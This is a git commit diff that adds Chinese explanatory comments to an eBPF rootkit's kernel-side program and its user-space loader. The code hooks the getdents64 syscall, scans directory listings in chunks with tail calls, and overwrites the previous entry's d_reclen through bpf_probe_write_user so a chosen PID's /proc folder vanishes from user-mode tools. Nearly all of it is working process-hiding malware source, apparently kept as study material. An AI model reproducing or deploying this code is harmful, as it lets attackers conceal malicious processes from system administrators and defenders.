80c56f0d70964bb9bf3c05a1cf1cac36fdca596b
haolipeng <1078285863@qq.com>
2025-04-07 17:57:59 +0800

    add comment to rootkit process hide

--- rootkit.bpf.c
+++ rootkit.bpf.c
@@ -10,10 +10,11 @@ volatile int target_ppid = 0;
 
 //宏定义
 #define MAX_PID_LEN 10
+//只
 const volatile int pid_to_hide_len = 0;
 const volatile char pid_to_hide[MAX_PID_LEN] = {0};
 
-// 映射表 存储dents 缓冲区的地址
+// map映射表 存储dents 缓冲区的地址
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
     __uint(max_entries, 8192);
@@ -21,7 +22,16 @@ struct {
     __type(value, u64);
 } map_buffs SEC(".maps");
 
-// 映射表，用于循环搜索数据
+// map映射表，key是pid_tgid,value是已读取的字节位置
+// 断点续读，ebpf循环的限制为最大200次，map_bytes_read用来记录读取位置，实现大目录的分批读取
+// 进度跟踪：记录每个进程的目录读取进度
+//第一次执行：从头开始读取目录项
+//如果 200 次循环后还有未读数据：
+//1、保存当前读取位置到 map_bytes_read
+//2、通过尾调用重新执行函数
+//3、新的执行从保存的位置继续读取
+//直到读完所有数据
+//这是一种典型的eBPF编程模式。确保在ebpf程序循环限制下，也能完整处理大型目录的众多内容
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
     __uint(max_entries, 8192);
@@ -29,7 +39,7 @@ struct {
     __type(value, u32);
 } map_bytes_read SEC(".maps");
 
-// 映射表，存储程序的尾调用的
+// map映射表，存储程序的尾调用的索引
 struct {
     __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
     __uint(max_entries, 5);
@@ -38,7 +48,7 @@ struct {
 }map_prog_array SEC(".maps");
 
 
-//映射表，存储实际的地址
+//map映射表，存储实际的地址
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
     __uint(max_entries, 8192);
@@ -46,7 +56,7 @@ struct {
     __type(value, u64);
 } map_to_patch SEC(".maps");
 
-// RingBuffer to send events to user space
+// 环形缓冲区，用于想用户空间发送数据
 struct {
     __uint(type, BPF_MAP_TYPE_RINGBUF);
     __uint(max_entries, 256 * 1024); // 256KB 的缓冲区
@@ -71,34 +81,34 @@ int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx) {
     unsigned int buff_count = ctx->args[2];
     bpf_printk("getdents64 called with pid: %d, fd: %d, buff_count: %d\n", pid, fd, buff_count);
 
-    // 将参数存储到map中,供退出函数使用
+    // 获取目录项的缓冲区地址，并保存到映射表中
     struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];
 
-    // 将缓冲区地址存储到map中
+    // 将pid_tgid对应的目录项缓冲区地址都存储到map中
     bpf_map_update_elem(&map_buffs, &pid_tgid, &dirp, BPF_ANY);
     
     return 0;
 }
 
+// 处理getdents64系统调用的退出事件
 SEC("tracepoint/syscalls/sys_exit_getdents64")
 int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
     size_t pid_tgid = bpf_get_current_pid_tgid();
     int total_bytes_read = ctx->ret;
-    //if total_bytes_read is 0, everything is been read, then return
+    //如果total_bytes_read为0, 没有读取到内容，则直接返回
     if(total_bytes_read <= 0) {
         return 0;
     }
 
-    // 从map中获取缓冲区地址
+    // 从map中获取pid_tgid对应的目录项的缓冲区地址
     long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_buffs, &pid_tgid);
     if(!pbuff_addr) {
         bpf_printk("buff_addr is NULL\n");
         return 0;
     }
 
-    // All of this is quite complex, but basically boils down to calling 'handle_getdents_exit' in a loop
-    // to iterate over the file listing in chunks of 200,and seeing if a folder with the name of our pid is in there.
-    // if we find it, use 'bpf_tail_call' to jump to handle_getdents_patch to do the actual patching.
+    // 迭代 200 个块中的文件列表，并查看其中是否有一个以我们的 pid 为名称的文件夹。
+    // 如果我们找到它，则使用“bpf_tail_call”跳转到 handle_getdents_patch 进行实际修补
     long unsigned int buff_addr = *pbuff_addr;
     struct linux_dirent64 *dirp = 0;
     int pid = pid_tgid >> 32;
@@ -106,6 +116,7 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
     char filename[MAX_PID_LEN];
     
     unsigned int bpos = 0;
+    //获取当前读取的位置    
     unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
     if(!pBPOS) {
         bpf_printk("error:pBPOS is NULL\n");
@@ -114,8 +125,9 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
 
     bpos = *pBPOS;
 
-    //循环200次来读取数据
+    //循环200次处理目录项，读取数据
     for (int i = 0; i < 200; i++) {
+        //如果读取位置大于等于总字节数，则表示已经读完所有数据，则退出循环
         if(bpos >= total_bytes_read) {
             break;
         }
@@ -135,23 +147,26 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
         }
         
         if(j == pid_to_hide_len){
-            //We have found the folder,jump to handle_getdents_patch so we can remove it!
+            //发现了文件夹,跳转到handle_getdents_patch函数，然后我们可以移除它!
             bpf_map_delete_elem(&map_buffs, &pid_tgid);
             bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
             bpf_tail_call(ctx, &map_prog_array, PROG_02);
         }
+        //将目录项缓冲区地址添加到map_to_patch映射标中
         bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
         bpos += d_reclen;
     }
 
-    //if we didn't find it, but there's still more to read,
-    //jump back the start of this function and keep looking
+    //如果我们没找到对应目录项，并且还有内容没有读完，跳回此函数的开头继续查找
     if(bpos < total_bytes_read) {
+        //更新已读取的位置
         bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
+        //尾调用自身，继续处理
+        //PROG_01为handle_getdents_exit，为当前函数
         bpf_tail_call(ctx, &map_prog_array, PROG_01);
     }
 
-    //delete the element of map
+    //所有数据都读取完成，从map中删除对应的记录
     bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
     bpf_map_delete_elem(&map_buffs, &pid_tgid);
     return 0;
@@ -160,53 +175,62 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
 SEC("tracepoint/syscalls/sys_exit_getdents64")
 int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx) {
     size_t pid_tgid = bpf_get_current_pid_tgid();
-    //only patch if we've already checked and found our pid's folder to hide
+    //确保已检查并找到待隐藏的pid文件夹时，才进行patch
     long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_to_patch, &pid_tgid);
     if(NULL == pbuff_addr){
+        //没找到，则直接返回
         return 0;
     }
 
     //Unlink target, by reading in previous linux_dirent64 struct, setting d_reclen to cover itself
+    //1. 读取前一个目录项 previous entry
     long unsigned int buff_addr = *pbuff_addr;
     struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)(buff_addr);
     short unsigned int d_reclen_previous = 0;
+    //2. 读取前一个目录项的长度
     bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);
     
+    //3. 读取要隐藏的目录项
     struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buff_addr + d_reclen_previous);
     short unsigned int d_reclen = 0;
+    //4. 读取要隐藏的目录项的长度
     bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
 
-    //Debug print
+    // ===== 调试信息打印 =====
+    //打印前一个目录下的文件名
     char filename[MAX_PID_LEN];
-    bpf_probe_read_user_str(filename, pid_to_hide_len, &dirp_previous->d_name);
-    filename[pid_to_hide_len - 1] = '\0';
+    bpf_probe_read_user_str(filename, MAX_PID_LEN, &dirp_previous->d_name);
+    filename[MAX_PID_LEN - 1] = '\0';
     bpf_printk("file previous: %s\n", filename);
     
+    //打印要隐藏的目录项的文件名
     bpf_probe_read_user_str(filename, pid_to_hide_len, &dirp->d_name);
     filename[pid_to_hide_len - 1] = '\0';
     bpf_printk("file next one: %s\n", filename);
 
-    //Attempt to overwrite
+    // ===== 执行隐藏操作 =====
+    // 核心隐藏逻辑：修改前一个目录项的长度，使其跨过要隐藏的目录项
+    // 新长度 = 前一个目录项上都 + 当前目录项长度
     short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
+    // 将新长度写到前一个目录项中
     long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));
 
-    //send event
+    // ===== 发送事件通知 =====
+    // 通过环形缓冲区向用户空间发送操作结果
     struct event* e;
     e = bpf_ringbuf_reserve(&rb, sizeof(*e),  0);
     if(e){
-        e->success = (ret == 0);
-        e->pid = (pid_tgid >> 32);
-        bpf_get_current_comm(&e->comm, sizeof(e->comm));
-        bpf_ringbuf_submit(e, 0);
+        e->success = (ret == 0); //内容篡改操作是否成功
+        e->pid = (pid_tgid >> 32);//pid值
+        bpf_get_current_comm(&e->comm, sizeof(e->comm));//获取进程名称
+        bpf_ringbuf_submit(e, 0);//提交事件
     }
 
+    //从map中删除已处理的缓冲区地址
     bpf_map_delete_elem(&map_to_patch, &pid_tgid);
 
     return 0;
 }
-
-
-
 
 
 
--- rootkit.c
+++ rootkit.c
@@ -16,7 +16,7 @@ const char argp_program_doc[] =
 "Uses eBPF to hide a process from usermode processes\n"
 "By hooking the getdents64 syscall and unlinking the pid folder\n"
 "\n"
-"USAGE: ./pidhide -p 2222 [-t 1111]\n";
+"USAGE: ./rootkit -p 2222 [-t 1111]\n";
 
 
 
@@ -65,40 +65,41 @@ int main(int argc, char *argv[]) {
     struct ring_buffer *rb = NULL;
     int err;
 
-    //1.parse command line arguments
+    /* 解析命令行参数 */
     err = argp_parse(&argp, argc, argv, 0, NULL, NULL);
     
-    //2.setup environment
+    /* 执行通用设置 */
     if (!setup()) {
         fprintf(stderr, "Failed to do common setup\n");
         return 1;
     };
 
-    /* Open BPF application */
+    /* 打开BPF程序 */
     skel = rootkit_bpf__open();
     if (!skel) {
         fprintf(stderr, "Failed to open BPF skeleton\n");
         return 1;
     }
     
-    //3.set the pid to hide,default is your own pid
+    /* 设置要隐藏的PID，默认为当前进程的PID */
     char pid_to_hide[10];
     if(env.pid_to_hide == 0) {
         env.pid_to_hide = getpid();
     }
 
+    //将pid_to_hide转换为字符串，并通过rodata->pid_to_hide传递到bpf程序
     sprintf(pid_to_hide, "%d", env.pid_to_hide);
     strncpy(skel->rodata->pid_to_hide, pid_to_hide, sizeof(skel->rodata->pid_to_hide));
     skel->rodata->pid_to_hide_len = strlen(pid_to_hide) + 1;
 
-    /* Load & verify BPF programs */
+    /* 加载并验证BPF程序 */
     err = rootkit_bpf__load(skel);
     if (err) {
         fprintf(stderr, "Failed to load and verify BPF skeleton\n");
         goto cleanup;
     }
 
-    /* Setup maps for tail calls */
+    /* 设置尾调用的映射表 */
     int index = PROG_01;
     int prog_fd = bpf_program__fd(skel->progs.handle_getdents_exit);
     int ret = bpf_map__update_elem(skel->maps.map_prog_array, &index, sizeof(index), &prog_fd, sizeof(prog_fd), BPF_ANY);
@@ -107,6 +108,7 @@ int main(int argc, char *argv[]) {
         goto cleanup;
     }
 
+    //BPF_ANY是创建新项或更新已有项
     index = PROG_02;
     prog_fd = bpf_program__fd(skel->progs.handle_getdents_patch);
     ret = bpf_map__update_elem(skel->maps.map_prog_array, &index, sizeof(index), &prog_fd, sizeof(prog_fd), BPF_ANY);
@@ -115,14 +117,14 @@ int main(int argc, char *argv[]) {
         goto cleanup;
     }
     
-    //3.attach tracepoint handler
+    /* 附加跟踪点 */
     err = rootkit_bpf__attach(skel);
     if (err) {
         fprintf(stderr, "Failed to attach BPF skeleton\n");
         goto cleanup;
     }
 
-    //4.Set up ring buffer polling 
+    /* 设置环形缓冲区轮询 */
     rb = ring_buffer__new(bpf_map__fd(skel->maps.rb), handle_event, NULL, NULL);
     if (!rb) {
         err = -1;
@@ -130,7 +132,7 @@ int main(int argc, char *argv[]) {
         goto cleanup;
     }
 
-    //5.print program running info
+    /*打印程序运行相关信息*/
     printf("Hidding process %d\n", env.pid_to_hide);
     printf("Successfully started! Please run `sudo cat /sys/kernel/debug/tracing/trace_pipe` "
            "to see output\n");
@@ -138,7 +140,7 @@ int main(int argc, char *argv[]) {
     //6.Poll events
     while (!exiting) {
         err = ring_buffer__poll(rb, 100 /* timeout, ms */);
-        /* Ctrl-C will cause -EINTR */
+        /* Ctrl-C 会导致 -EINTR */
         if (err == -EINTR) {
             err = 0;
             break;
@@ -150,7 +152,7 @@ int main(int argc, char *argv[]) {
     }
 
 cleanup:
-    //7.free resources
+    /* 释放资源 */
     ring_buffer__free(rb);
     rootkit_bpf__destroy(skel);
     return err < 0 ? -err : 0;
